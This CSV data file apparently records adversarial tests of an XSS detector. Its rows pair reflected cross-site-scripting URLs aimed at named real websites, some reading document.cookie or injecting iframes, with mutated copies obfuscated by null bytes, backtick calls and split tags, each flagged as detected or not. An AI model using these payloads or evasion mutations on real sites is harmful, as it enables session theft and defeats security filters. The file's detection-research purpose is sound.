Initial Payload,Initial Payload Tokenized,Mutated Payload,Mutated Payload Tokenized,Not Detected
http://www.austinchronicle.com/gyrobase/archive/search?search=%22%3e%27%3e%3cscript%3ealert%28123%29<br>%3c%2fscript%3e%22%27&amp;sort=4&amp;sent=1&amp;mode=2&amp;x=0&amp;y=0&amp;section=&amp;authornarrow=&amp;oldsearch=lee+leffingwell,"[['http://u', '>', '>', '<script>', 'alert(', '0', ')', '</script>', 'sort=', 'None', 'mode=', 'x=', 'y=', 'section=', 'None', 'None']]",http://www.austinchronicle.com/gyrobase/archive/search?search=%22%3e%27%3cscript%00%3cscript%00%3ealert%28123%29<br%00 %3c%00%2fscript%3c%00%2fscript%3e%22%27&amp;sort=4&amp;sent=1&amp;mode=2&amp;x=0&amp;y=0&amp;section=&amp;authornarrow=&amp;oldsearch=lee+leffingwell,"[['http://u', '>', 'None', 'alert(', '0', ')', 'None', 'sort=', 'None', 'mode=', 'x=', 'y=', 'section=', 'None', 'None']]",False
http://nonki.ffvv.net/?d=2007-09-12%3c/title%3e%22%3e'%3e%3cscript%3ealert('xss')%3c/script%3e,"[['http://u', '</title>', '>', '>', '<script>', 'alert(', ""'xss'"", ')', '</script>']]",http://nonki.ffvv.net/?d=2007-09-12%3c%00%00/title%00%3c%00/title%00%00%3e%3c%00%00/title%00%3c%00/title%00%00%3e%22%3e'%3c%00script%00%3c%00%00%00script%00%3e%3c%00script%00%3c%00%00%00script%00%3etop[8680439.toString`30`]`1``'xss'`%3c%00%00/script%3c%00%00%00/script%00%3e%3c%00%00/script%3c%00%00%00/script%00%3e,"[['http://u', 'None', 'None', '>', 'None', 'None', ""'xss'"", 'None', 'None']]",False
http://www.vulnerabilitydatabase.com/detailed-alerts?cve=cve-2011-1011%3&quot;&lt;/title&gt;&lt;body<br>onload=alert(&quot;xss&quot;)&gt;,"[['http://u', '</title>', 'None']]",http://www.vulnerabilitydatabase.com/detailed-alerts?cve=cve-2011-1011%3&quot;&lt;%00/title&gt;&lt;body<br>onload=alert(&quot;xss&quot;)%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.thyssenkruppelevator.com/search.asp?query=dsfg%22%3e%3cscript%3ealert(1337)%3c/script%3e&amp;<br>submit=submit,"[['http://u', '>', '<script>', 'alert(', '0', ')', '</script>', 'submit=']]",http://www.thyssenkruppelevator.com/search.asp?query=dsfg%22%3cscript%00%3ealert`1337`%3c%00/script%3e&amp;<br%00>submit=submit,"[['http://u', 'None', 'None', 'None', 'submit=']]",True
http://houston.astros.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,"[['http://u', '<script>', 'alert(', ')', '</script>']]",http://houston.astros.mlb.com/media/video.jsp?mid=%3c%00script&gt;alert`'pappy%20was%20here'`;&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
http://orders.foleydistributing.com/webcatalog/list.asp?line=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://orders.foleydistributing.com/webcatalog/list.asp?line=&quot;&lt;%00script&gt;alert`&quot;maxwel&quot;`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://1.tool.ms/?id=test&amp;n=5&amp;psw='%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.com%22)%3c/<br>script%3e,"[['http://u', 'n=', 'None', '>', '>', '>', '<script>', 'alert(', ')', '</script>']]",http://1.tool.ms/?id=test&amp;n=5&amp;psw=%3e%22%3e%3cscript%00%3ealert`%22xss%20by%20kusomiso.com%22`%3c/<br script%00%3e,"[['http://u', 'n=', 'None', '>', '>', 'None', 'None']]",False
http://hforum.net/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://hforum.net/directory.php?cat=%22%3cscript%00%3ealert`document.cookie`%3c/script%00%3e,"[['http://u', 'None', 'None']]",True
http://srv1.lede.co.uk/web/default.jsp?pageid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://srv1.lede.co.uk/web/default.jsp?pageid=&quot;&lt;script%00&gt;alert`&quot;maxwel&quot;`&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
http://www.morkhagenmotorsport.net/bildegalleri/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scr<br>ipt&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;.com,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.morkhagenmotorsport.net/bildegalleri/igallery.asp?d=&quot;&lt;%00script&gt;alert`document.cookie`&lt;%00/scr<br>ipt&gt;&lt;%00marquee&lt;h1&gt;by%20narcoticxs&lt;/h1&lt;%00/marquee&gt;.com,"[['http://u', 'None', 'None', 'None', 'None']]",True
http://www.msanti.net/blog/index.php?action=search&amp;item=content&amp;blog=%3e%22%3e%3cscript%20%0a%0d%3ea<br>lert(document.cookie)%3b%3c/script%3e,"[['http://u', 'item=', 'None', '>', '>', '<script \n\r>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.msanti.net/blog/index.php?action=search&amp;item=content&amp;blog=%3e%22%3cscript%20%0a%0d%00%3cscript%20%0a%0d%00%3e%3cscript%20%0a%0d%00%3cscript%20%0a%0d%00%3ea<br%00 <br%00 <br%00 <br%00 lert`document.cookie`%3b%3c%00/script%3c%00/script%3e%3c%00/script%3c%00/script%3e,"[['http://u', 'item=', 'None', '>', 'None', 'None', 'None', 'None']]",False
http://www.albumsinc.com/search_results.asp?search_term=%22%3e%3cscript+src%3dhttp%3a%2f%2fwww.filed<br>en.com%2ffiles%2f2008%2f1%2f10%2f1691310%2fxss.gif%3e&amp;image1.x=0&amp;image1.y=0,"[['http://u', '>', 'None', 'x=', 'y=']]",http://www.albumsinc.com/search_results.asp?search_term=%22%3cscript+src%3dhttp%3a%2f%2fwww.filed<br%00 en.com%2ffiles%2f2008%2f1%2f10%2f1691310%2fxss.gif%3e&amp;image1.x=0&amp;image1.y=0,"[['http://u', 'None', 'x=', 'y=']]",True
http://portsmon.freebsd.org/portsconcordanceformaintainer.py?maintainer=alex%40hugo.bmg.gv.at%27%22%<br>3e%3c/title%3e%3cscript%3ealert(%22xss%22);%3c/script%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1%3exss<br>%20by%20xylitol%3c/h1%3e%3c/marquee%3e,"[['http://u', '>', '</title>', '<script>', 'alert(', '""xss""', ')', '</script>', '<marquee bgcolor=""red"">', '<h0>', '</h0>', '</marquee>']]",http://portsmon.freebsd.org/portsconcordanceformaintainer.py?maintainer=alex%40hugo.bmg.gv.at%27%22%<br 3e%3c/title%3cscript%3etop['al'+'ert']`1``%22xss%22`;%3c/script%3cmarquee%20bgcolor=%22red%22%3ch1%3exss<br %20by%20xylitol%3c/h1%3c/marquee%3e,"[['http://u', 'None', 'None', 'None', 'None', 'None']]",True
http://www.best.go.tz/news.asp?letter=%3cscript%3ealert%28document.cookie%29%3c/script%3e,"[['http://u', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.best.go.tz/news.asp?letter=<script>/drfv//drfv//drfv//drfv/alert%28document.cookie%29%3c/script%3e,"[['http://u', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",False
http://www.fenerbahce.com/=?&lt;script&gt;alert(&quot;galatasaray:)&quot;)&lt;/script&gt;,"[['http://u', '<script>', 'alert(', 'None', ')', '</script>']]",//www.fenerbahce.com/=?&lt;script%00&gt;alert`&quot;galatasaray:`&quot;`&lt;%00/script&gt;,"[['http://u', 'None', 'None', 'None']]",True
http://www.dancesportbc.com/content.php?sectionid=3&amp;contentid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;,"[['http://u', 'None', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.dancesportbc.com/content.php?sectionid=3&amp;contentid=&quot;&lt;%00script&gt;alert`document.cookie`&lt;%00/scri<br pt&gt;,"[['http://u', 'None', 'None', 'None']]",True
http://www.pixelempireclothing.com/fr/recherche?orderby=position&orderway=desc&search_query=\%22/%3e%3cscript%3ealert(1);%3c/script%3e,"[['http://u', 'None', 'None', '>', '<script>', 'alert(', '0', ')', '</script>']]",http://www.pixelempireclothing.com/fr/recherche?orderby=position&orderway=desc&search_query=\%22/%3cscript%00%3e%3cscript%00%3ealert`1`;%3c/script%00%3e%3c/script%00%3e,"[['http://u', 'None', 'None', 'None', 'None', 'None', 'None']]",True
http://www.bbb.org/us/wwwroot/search.aspx?site=113&amp;s=&quot;&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,"[['http://u', 's=', '>', '<script>', 'alert(', '0', ')', '</script>']]",http://www.bbb.org/us/wwwroot/search.aspx?site=113&amp;s=&quot;&quot;&lt;%00script&gt;alert`1`;&lt;/script%00&gt;,"[['http://u', 's=', 'None', 'None']]",True
http://www.antikorupcija-savet.sr.gov.yu/view.jsp?articleid=%22%3e%3cscript%3ealert(1)%3c/script%3e%<br>3c/textarea%3e%3cscript%3ealert(%22kaksii_was_here%22)%3cscript%3ealert('kaksii_was_here');alert(1)%<br>3c/script%3e%22%3c/html%3e%3chtml%3e%3cscript%3ealert(10111)%3c/script%3e%3cdiv%20align=center%3e%20<br>%3cfont%20size=4%3e%3ctextarea%20name=1%20cols=100000%20rows=10000%20id=1%3ekaksii%20was%20here%3c/t<br>extarea%3e%3c/font%3e%3c/div%3e%3cnoscript%3e%3cplaintext%3e,"[['http://u', '>', '<script>', 'alert(', 'None', ')', '</script>', 'None', 'None', 'None', '</textarea>', '</font>', '</div>', '<noscript>', '<plaintext>']]",http://www.antikorupcija-savet.sr.gov.yu/view.jsp?articleid=%22%3cscript%00%00%3ealert`1`%3c%00%00/script%3e%<br 3c/textarea%3c%00script%00%3ealert`%22kaksii_was_here%22`%3cscript%00%00%3ealert`'kaksii_was_here'`;alert`1`%<br 3c/script%3e%22%3c%00/html%00%3c%00html%00%3c%00script%00%3ealert`10111`%3c%00/script%00%3c%00div%20align=center%00%3e%20<br %3c%00%00font%20size=4%3c%00textarea%20name=1%20cols=100000%20rows=10000%20id=1%00%3ekaksii%20was%20here%3c/t<br extarea%00%00%3c%00/font%00%3c%00/div%00%3c%00%00noscript%3c%00plaintext%00%3e,"[['http://u', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None']]",True
http://www.bretagnealaferme.com/default.phtml?ps_pays=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://www.bretagnealaferme.com/default.phtml?ps_pays=&quot;&lt;%00script&gt;alert`&quot;maxwel&quot;`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://happynewyear.com/search.php?uid=ws104779728bdeb8a4.16%22%3e'%3e%3cscript%3ealert(/xss/)%3c/sc<br>ript%3e401799&amp;src=&amp;term=holiday+lights&amp;args=qs%3d06oenya4zgjblucri9zo45n81yqmmu0buxfdpasfjpbuixg0kp4<br>cac_ju0-hv939gcomitdnpieiysvg6ivdchay_t9-vrog9_pprbeyt-mcg14wet8yzeo98qtwbyil3pk6ealexvtiyyouymup_6z<br>yqo1nwk3jsgkut63ctsm9najn7lbfakjbs0b0hnoycinkdifgrn3ubdmtpu0w9z5xvvv9-u6ronea..%2cyt0z&amp;sec=r,"[['http://u', '>', '>', '<script>', 'alert(', '/xss/', ')', '</script>', 'src=', 'term=', 'None', 'qs=', 'None']]",http://happynewyear.com/search.php?uid=ws104779728bdeb8a4.16%22%3c%00%00script%3etop[/al/.source+/ert/.source/]`1``/xss/`%3c%00/sc<br%00 ript%3e401799&amp;src=&amp;term=holiday+lights&amp;args=qs%3d06oenya4zgjblucri9zo45n81yqmmu0buxfdpasfjpbuixg0kp4<br cac_ju0-hv939gcomitdnpieiysvg6ivdchay_t9-vrog9_pprbeyt-mcg14wet8yzeo98qtwbyil3pk6ealexvtiyyouymup_6z<br yqo1nwk3jsgkut63ctsm9najn7lbfakjbs0b0hnoycinkdifgrn3ubdmtpu0w9z5xvvv9-u6ronea..%2cyt0z&amp;sec=r,"[['http://u', 'None', 'None', 'src=', 'term=', 'None', 'qs=', 'None', 'None', 'None']]",True
http://yaggs.de/searchterms/search?searchterm%5bname%5d=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3<br>e&amp;go=suchen,"[['http://u', '>', '<script>', 'alert(', '0', ')', '</script>', 'go=']]",http://yaggs.de/searchterms/search?searchterm%5bname%5d=%22%3cscript%00%3e%3cscript%00%3ealert%281%29%3c%2fscript%3<br%00 e&amp;go=suchen,"[['http://u', 'None', 'None', 'alert(', '0', ')', 'None', 'go=']]",False
http://46.911-job.ru/az.php?zc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://46.911-job.ru/az.php?zc=&quot;&lt;script%00&gt;alert`&quot;maxwel&quot;`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.biopolsis.hacettepe.edu.tr/bsrg/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=i<br>ndex2.php?option=com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;<br>cid=1&amp;url=http://xssed.com,"[['http://u', 'user_rating=', 'submit_vote=', 'option=', 'user_rating=', 'submit_vote=', 'task=', 'pop=', 'itemid=', 'cid=', 'url=', 'http://xssed']]",http://www.biopolsis.hacettepe.edu.tr/bsrg/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=i<br>ndex2.php?option=com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;<br>cid=1&amp;url=http://xssed.com,"[['http://u', 'user_rating=', 'submit_vote=', 'option=', 'user_rating=', 'submit_vote=', 'task=', 'pop=', 'itemid=', 'cid=', 'url=', 'http://xssed']]",True
http://app.radio.musica.uol.com.br/radiouol/player/frameset.php?opcao=umamusica&amp;nomeplaylist=%22%3e%<br>3cframe%20src=http://xssed.com%3e%3c/frameset%3e,"[['http://u', 'None', '>', 'None', 'None']]",http://app.radio.musica.uol.com.br/radiouol/player/frameset.php?opcao=umamusica&amp;nomeplaylist=%22%3e%<br%00 3cframe%20src=http://xssed.com%3c%00%00/frameset%00%3e,"[['http://u', 'None', '>', 'None']]",False
http://www.niluferanaokulu.k12.tr/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=index2.php<br>?option=com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url<br>=http://www.xssed.com,"[['http://u', 'user_rating=', 'submit_vote=', 'option=', 'user_rating=', 'submit_vote=', 'task=', 'pop=', 'itemid=', 'cid=', 'url=', 'http://www']]",http://www.niluferanaokulu.k12.tr/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=index2.php<br>?option=com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url<br>=http://www.xssed.com,"[['http://u', 'user_rating=', 'submit_vote=', 'option=', 'user_rating=', 'submit_vote=', 'task=', 'pop=', 'itemid=', 'cid=', 'url=', 'http://www']]",True
"http://bank-maskan.ir/page.aspx?search=""><script>alert('by :takpar')</script>&mid=1418&page=search/advancedsearch","[['http://u', '>', '<script>', 'alert(', ')', '</script>', 'None', 'page=']]","http://bank-maskan.ir/page.aspx?search=""><script>/drfv/alert`'by :takpar'`</script>&mid=1418&page=search/advancedsearch","[['http://u', '>', '<script>', '</script>', 'None', 'page=']]",False
https://bankingportal.sparkasse-dieburg.de/banking/?konto=%22%3e%3ciframe%20src=http://www.google.de<br>%3e,"[['http://u', '>', '<iframe src=http://www.google.de>']]",https://bankingportal.sparkasse-dieburg.de/banking/?konto=%22%3ciframe%20src=http://www.google.de<br%00 %3e,"[['http://u', 'None']]",True
http://www.thainavigation.com/report_result.php?cat_id=1&amp;p_id=243'%3e%22%3e%3ciframe%20src=http://ku<br>somiso.com/xss.html%20%3c,"[['http://u', 'None', '>', '>', '<iframe', 'src=', 'http://kusomiso']]",http://www.thainavigation.com/report_result.php?cat_id=1&amp;p_id=243%3e%22%3e%3ciframe%20src=http://ku<br%00%00%00 <br%00%00%00 somiso.com/xss.html%20%3c,"[['http://u', 'None', '>', '>', '<iframe', 'src=', 'None', 'None', 'None']]",False
http://www.turkzeka.com/zeka/arsiv.asp?baslik=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.turkzeka.com/zeka/arsiv.asp?baslik=&quot;&lt;%00script&gt;alert`document.cookie`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.gameland.lt/index.php?search=%22%3cscript%3ealert%287%29%3b%3c%2fscript%3e,"[['http://u', '<script>', 'alert(', '0', ')', '</script>']]",http://www.gameland.lt/index.php?search=%22%3cscript%00%00%3etop[8680439.toString`30`]`1`%287%29%3b%3c%2fscript%00%00%3e,"[['http://u', 'None', '0', ')', 'None']]",False
